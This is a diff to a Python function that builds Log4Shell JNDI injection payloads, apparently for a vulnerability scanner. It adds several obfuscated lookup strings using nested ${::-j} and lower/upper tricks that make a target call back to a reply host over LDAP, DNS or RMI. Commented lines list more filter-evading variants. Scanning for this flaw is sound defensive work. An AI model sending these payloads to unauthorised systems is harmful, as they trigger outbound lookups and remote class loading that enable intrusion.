@@ -77,10 +77,28 @@ def payload_generation(url_input, reply_host, timeout):
     identifier = uuid.uuid4()
     logging.debug(f"Generated UUID: {identifier}")
 
+
     payloads = []
     payloads.append(f'${{jndi:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
     payloads.append(f'${{jndi:dns://{identifier}.{url_input.hostname}.{reply_host}:53/test.class}}')
     payloads.append(f'${{jndi:rmi://{identifier}.{url_input.hostname}.{reply_host}:1099/test.class}}')
+
+    payloads.append(f'${{${{::-j}}ndi:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}di:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}i:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}mi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}i://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+
+#${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
+#${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
+#${jndi:rmi://adsasd.asdasd.asdasd}
+#${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+#${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+#${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+#${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
+
 
     header_name = 'User-Agent'
 
